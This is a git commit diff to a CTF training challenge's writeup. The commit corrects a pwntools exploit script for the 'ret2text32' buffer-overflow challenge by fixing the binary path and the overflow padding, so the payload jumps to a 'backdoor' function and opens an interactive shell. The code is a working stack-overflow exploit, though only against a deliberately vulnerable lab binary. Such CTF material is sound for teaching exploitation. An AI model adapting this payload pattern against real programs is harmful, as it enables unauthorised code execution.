2818081d62bd05fd40e25a2af83bfd971f10e6ac
Yeol <136407746+13m0n4de@users.noreply.github.com>
2024-10-18 22:32:21 +0800

    fix(pwn/ret2text32): 修复题解中填充大小的计算错误

--- challenges/pwn/ret2text32/writeup/exp.py
+++ challenges/pwn/ret2text32/writeup/exp.py
@@ -3,10 +3,10 @@ from pwn import *
 context.arch = "i386"
 context.log_level = "debug"
 
-io = process("../attachments/ret2text_32")
+io = process("../attachments/ret2text32")
 elf = ELF("../attachments/ret2text32")
 
-payload = flat([cyclic(128), b"A" * 4, elf.sym["backdoor"]])
+payload = flat([cyclic(136), b"A" * 4, elf.sym["backdoor"]])
 io.sendlineafter(b"You: ", payload)
 
 io.interactive()
